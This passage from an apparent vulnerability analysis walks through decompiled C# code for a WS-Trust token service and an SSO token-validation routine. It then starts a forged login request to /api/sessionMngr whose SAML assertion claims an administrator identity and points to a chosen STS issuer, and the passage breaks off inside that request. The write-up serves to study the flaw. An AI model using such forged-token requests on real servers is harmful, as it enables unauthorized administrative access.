</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.IssueOperationCompleted = <span style=color:#66d9ef>new</span> SendOrPostCallback(<span style=color:#66d9ef>this</span>.OnIssueOperationCompleted);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>base</span>.InvokeAsync(<span style=color:#e6db74>&#34;Issue&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken }, <span style=color:#66d9ef>this</span>.IssueOperationCompleted, userState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> OnIssueOperationCompleted(<span style=color:#66d9ef>object</span> arg)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.IssueCompleted != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				InvokeCompletedEventArgs invokeCompletedEventArgs = (InvokeCompletedEventArgs)arg;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.IssueCompleted(<span style=color:#66d9ef>this</span>, <span style=color:#66d9ef>new</span> IssueCompletedEventArgs(invokeCompletedEventArgs.Results, invokeCompletedEventArgs.Error, invokeCompletedEventArgs.Cancelled, invokeCompletedEventArgs.UserState));
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>		[SoapDocumentMethod(&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Renew&#34;, Use = SoapBindingUse.Literal, ParameterStyle = SoapParameterStyle.Bare)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>		[return: XmlElement(&#34;RequestSecurityTokenResponse&#34;, Namespace = &#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;)]</span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> RequestSecurityTokenResponseType Renew([XmlElement(Namespace = <span style=color:#e6db74>&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;</span>)] RequestSecurityTokenType RequestSecurityToken)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseType)<span style=color:#66d9ef>base</span>.Invoke(<span style=color:#e6db74>&#34;Renew&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken })[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> IAsyncResult BeginRenew(RequestSecurityTokenType RequestSecurityToken, AsyncCallback callback, <span style=color:#66d9ef>object</span> asyncState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>base</span>.BeginInvoke(<span style=color:#e6db74>&#34;Renew&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken }, callback, asyncState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> RequestSecurityTokenResponseType EndRenew(IAsyncResult asyncResult)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseType)<span style=color:#66d9ef>base</span>.EndInvoke(asyncResult)[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> RenewAsync(RequestSecurityTokenType RequestSecurityToken)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>this</span>.RenewAsync(RequestSecurityToken, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> RenewAsync(RequestSecurityTokenType RequestSecurityToken, <span style=color:#66d9ef>object</span> userState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.RenewOperationCompleted == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.RenewOperationCompleted = <span style=color:#66d9ef>new</span> SendOrPostCallback(<span style=color:#66d9ef>this</span>.OnRenewOperationCompleted);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>base</span>.InvokeAsync(<span style=color:#e6db74>&#34;Renew&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken }, <span style=color:#66d9ef>this</span>.RenewOperationCompleted, userState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> OnRenewOperationCompleted(<span style=color:#66d9ef>object</span> arg)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.RenewCompleted != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				InvokeCompletedEventArgs invokeCompletedEventArgs = (InvokeCompletedEventArgs)arg;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.RenewCompleted(<span style=color:#66d9ef>this</span>, <span style=color:#66d9ef>new</span> RenewCompletedEventArgs(invokeCompletedEventArgs.Results, invokeCompletedEventArgs.Error, invokeCompletedEventArgs.Cancelled, invokeCompletedEventArgs.UserState));
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>		[SoapDocumentMethod(&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Validate&#34;, Use = SoapBindingUse.Literal, ParameterStyle = SoapParameterStyle.Bare)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>		[return: XmlElement(&#34;RequestSecurityTokenResponse&#34;, Namespace = &#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;)]</span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> RequestSecurityTokenResponseType Validate([XmlElement(Namespace = <span style=color:#e6db74>&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;</span>)] RequestSecurityTokenType RequestSecurityToken)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseType)<span style=color:#66d9ef>base</span>.Invoke(<span style=color:#e6db74>&#34;Validate&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken })[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> IAsyncResult BeginValidate(RequestSecurityTokenType RequestSecurityToken, AsyncCallback callback, <span style=color:#66d9ef>object</span> asyncState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>base</span>.BeginInvoke(<span style=color:#e6db74>&#34;Validate&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken }, callback, asyncState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> RequestSecurityTokenResponseType EndValidate(IAsyncResult asyncResult)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseType)<span style=color:#66d9ef>base</span>.EndInvoke(asyncResult)[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> ValidateAsync(RequestSecurityTokenType RequestSecurityToken)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>this</span>.ValidateAsync(RequestSecurityToken, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> ValidateAsync(RequestSecurityTokenType RequestSecurityToken, <span style=color:#66d9ef>object</span> userState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.ValidateOperationCompleted == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.ValidateOperationCompleted = <span style=color:#66d9ef>new</span> SendOrPostCallback(<span style=color:#66d9ef>this</span>.OnValidateOperationCompleted);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>base</span>.InvokeAsync(<span style=color:#e6db74>&#34;Validate&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken }, <span style=color:#66d9ef>this</span>.ValidateOperationCompleted, userState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> OnValidateOperationCompleted(<span style=color:#66d9ef>object</span> arg)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.ValidateCompleted != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				InvokeCompletedEventArgs invokeCompletedEventArgs = (InvokeCompletedEventArgs)arg;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.ValidateCompleted(<span style=color:#66d9ef>this</span>, <span style=color:#66d9ef>new</span> ValidateCompletedEventArgs(invokeCompletedEventArgs.Results, invokeCompletedEventArgs.Error, invokeCompletedEventArgs.Cancelled, invokeCompletedEventArgs.UserState));
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>		[SoapDocumentMethod(&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512/RSTR/Issue&#34;, Use = SoapBindingUse.Literal, ParameterStyle = SoapParameterStyle.Bare)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>		[return: XmlElement(&#34;RequestSecurityTokenResponseCollection&#34;, Namespace = &#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;)]</span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> RequestSecurityTokenResponseCollectionType Challenge([XmlElement(Namespace = <span style=color:#e6db74>&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;</span>)] RequestSecurityTokenResponseType RequestSecurityTokenResponse)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseCollectionType)<span style=color:#66d9ef>base</span>.Invoke(<span style=color:#e6db74>&#34;Challenge&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityTokenResponse })[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> IAsyncResult BeginChallenge(RequestSecurityTokenResponseType RequestSecurityTokenResponse, AsyncCallback callback, <span style=color:#66d9ef>object</span> asyncState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>base</span>.BeginInvoke(<span style=color:#e6db74>&#34;Challenge&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityTokenResponse }, callback, asyncState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> RequestSecurityTokenResponseCollectionType EndChallenge(IAsyncResult asyncResult)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseCollectionType)<span style=color:#66d9ef>base</span>.EndInvoke(asyncResult)[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> ChallengeAsync(RequestSecurityTokenResponseType RequestSecurityTokenResponse)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>this</span>.ChallengeAsync(RequestSecurityTokenResponse, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> ChallengeAsync(RequestSecurityTokenResponseType RequestSecurityTokenResponse, <span style=color:#66d9ef>object</span> userState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.ChallengeOperationCompleted == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.ChallengeOperationCompleted = <span style=color:#66d9ef>new</span> SendOrPostCallback(<span style=color:#66d9ef>this</span>.OnChallengeOperationCompleted);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>base</span>.InvokeAsync(<span style=color:#e6db74>&#34;Challenge&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityTokenResponse }, <span style=color:#66d9ef>this</span>.ChallengeOperationCompleted, userState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> OnChallengeOperationCompleted(<span style=color:#66d9ef>object</span> arg)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.ChallengeCompleted != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				InvokeCompletedEventArgs invokeCompletedEventArgs = (InvokeCompletedEventArgs)arg;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>this</span>.ChallengeCompleted(<span style=color:#66d9ef>this</span>, <span style=color:#66d9ef>new</span> ChallengeCompletedEventArgs(invokeCompletedEventArgs.Results, invokeCompletedEventArgs.Error, invokeCompletedEventArgs.Cancelled, invokeCompletedEventArgs.UserState));
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>void</span> CancelAsync(<span style=color:#66d9ef>object</span> userState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>base</span>.CancelAsync(userState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> SecurityHeaderType MakeNewSecurityHeader()
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			DateTime utcNow = SManagedDateTime.UtcNow;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> SecurityHeaderType
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>				Timestamp = <span style=color:#66d9ef>new</span> TimestampType
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					Created = <span style=color:#66d9ef>new</span> AttributedDateTime
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						Value = STSService.FormatTimestamp(utcNow)
</span></span><span style=display:flex><span>					},
</span></span><span style=display:flex><span>					Expires = <span style=color:#66d9ef>new</span> AttributedDateTime
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						Value = STSService.FormatTimestamp(utcNow + TimeSpan.FromMinutes(<span style=color:#ae81ff>30.0</span>))
</span></span><span style=display:flex><span>					}
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>			};
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>string</span> FormatTimestamp(DateTime dt)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> dt.ToString(<span style=color:#e6db74>&#34;yyyy-MM-dd&#39;T&#39;HH:mm:ss.FFF&#39;Z&#39;&#34;</span>, CultureInfo.InvariantCulture);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>override</span> XmlWriter GetWriterForMessage(SoapClientMessage message, <span style=color:#66d9ef>int</span> bufferSize)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			message.Headers.Clear();
</span></span><span style=display:flex><span>			message.Headers.Add(STSService.MakeNewSecurityHeader());
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>base</span>.GetWriterForMessage(message, bufferSize);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> SendOrPostCallback IssueOperationCompleted;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> SendOrPostCallback RenewOperationCompleted;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> SendOrPostCallback ValidateOperationCompleted;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>private</span> SendOrPostCallback ChallengeOperationCompleted;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Once an instance is created (line 1), the <code>ValidateAuthToken</code> is executed and our <code>documentElement</code> object is passed to it, if you&rsquo;ve forget, this variable holds the entire tree of our XML parsed by <code>XmlDocument()</code> in previous statements, now lets understand the inner-workings of this method as well, after all, this is where the token is hopefully validated.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#ae81ff>1</span>:  <span style=color:#66d9ef>using</span> (CVcAuthService cvcAuthService = CVcAuthService.Open(uri))
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>:  {
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span>:  	<span style=color:#66d9ef>if</span> (!cvcAuthService.ValidateAuthToken(documentElement))
</span></span><span style=display:flex><span><span style=color:#ae81ff>4</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>5</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#e6db74>&#34;Failed to validate Single Sign-On token&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>6</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>7</span>:  }
</span></span></code></pre></div><p>Simply put, this method will expect the XML we&rsquo;ve provided and makes a call to the <code>Validate</code> method which belongs to the class we discussed just a bit earlier, the <code>STSService</code> and it includes our token inside the <code>ValidateTarget</code> member</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>bool</span> ValidateAuthToken(XmlElement token)
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  	RequestSecurityTokenResponseType requestSecurityTokenResponseType = <span style=color:#66d9ef>this</span>._service.Validate(<span style=color:#66d9ef>new</span> RequestSecurityTokenType
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  		TokenType = TokenTypeEnum.httpdocsoasisopenorgwssxwstrust200512RSTRStatus,
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  		RequestType = RequestTypeEnum.httpdocsoasisopenorgwssxwstrust200512Validate,
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  		ValidateTarget = token,
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  		TokenTypeSpecified = <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  	});
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  	StatusCodeEnum code = requestSecurityTokenResponseType.Status.Code;
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  	<span style=color:#66d9ef>bool</span> flag;
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  	<span style=color:#66d9ef>if</span> (code != StatusCodeEnum.httpdocsoasisopenorgwssxwstrust200512statusvalid)
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  		<span style=color:#66d9ef>if</span> (code != StatusCodeEnum.httpdocsoasisopenorgwssxwstrust200512statusinvalid)
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>15</span>:  			<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NotImplementedException(<span style=color:#e6db74>&#34;Unknown token validation result status code.&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>16</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span>:  		flag = <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>18</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>19</span>:  	<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span>:  		flag = <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>:  	Log.Message(<span style=color:#e6db74>&#34;Token is {0}. Message: {1}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
</span></span><span style=display:flex><span><span style=color:#ae81ff>24</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span>:  		flag ? <span style=color:#e6db74>&#34;valid.&#34;</span> : <span style=color:#e6db74>&#34;invalid.&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>26</span>:  		requestSecurityTokenResponseType.Status.Reason
</span></span><span style=display:flex><span><span style=color:#ae81ff>27</span>:  	});
</span></span><span style=display:flex><span><span style=color:#ae81ff>28</span>:  	<span style=color:#66d9ef>return</span> flag;
</span></span><span style=display:flex><span><span style=color:#ae81ff>29</span>:  }
</span></span></code></pre></div><p>following is a reminder on how the <code>Validate</code> method has been defined, there is no imeplemntation since this method is actually creating a SOAP Request instead and sending it across to the previously populated <code>this._service.Url</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#a6e22e>[SoapDocumentMethod(&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Validate&#34;, Use = SoapBindingUse.Literal, ParameterStyle = SoapParameterStyle.Bare)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>[return: XmlElement(&#34;RequestSecurityTokenResponse&#34;, Namespace = &#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;)]</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> RequestSecurityTokenResponseType Validate([XmlElement(Namespace = <span style=color:#e6db74>&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;</span>)] RequestSecurityTokenType RequestSecurityToken)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseType)<span style=color:#66d9ef>base</span>.Invoke(<span style=color:#e6db74>&#34;Validate&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken })[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>At this point, given a request like the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>POST /api/sessionMngr/?v=latest HTTP/2
</span></span><span style=display:flex><span>Host: 192.168.253.180:9398
</span></span><span style=display:flex><span>Content-Length: 1485
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>Accept: application/xml, text/xml, */*; q=0.01
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{&#34;VMwareSSOToken&#34;:&#34;<span style=color:#f92672>&lt;saml2:Assertion</span> <span style=color:#a6e22e>xmlns:saml2=</span><span style=color:#e6db74>&#34;urn:oasis:names:tc:SAML:2.0:assertion&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;saml2:Issuer&gt;</span>https://192.168.253.1/STSService<span style=color:#f92672>&lt;/saml2:Issuer&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;saml2:Subject&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;saml2:NameID&gt;</span>administrator@evilcorp.local<span style=color:#f92672>&lt;/saml2:NameID&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;saml2:SubjectConfirmation&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;saml2:SubjectConfirmationData</span> <span style=color:#a6e22e>NotOnOrAfter=</span><span style=color:#e6db74>&#34;2024-06-10T00:00:00Z&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/saml2:SubjectConfirmation&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/saml2:Subject&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;saml2:AuthnStatement</span> <span style=color:#a6e22e>AuthnInstant=</span><span style=color:#e6db74>&#34;2024-06-09T00:00:00Z&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;saml2:AuthnContext&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;saml2:AuthnContextClassRef&gt;</span>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport<span style=color:#f92672>&lt;/saml2:AuthnContextClassRef&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/saml2:AuthnContext&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/saml2:AuthnStatement&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;saml2:AttributeStatement&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;saml2:Attribute</span> <span style=color:#a6e22e>Name=</span><span style=color:#e6db74>&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;saml2:AttributeValue&gt;</span>username@example.com<span style=color:#f92672>&lt;/saml2:AttributeValue&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/saml2:Attribute&gt;</span>
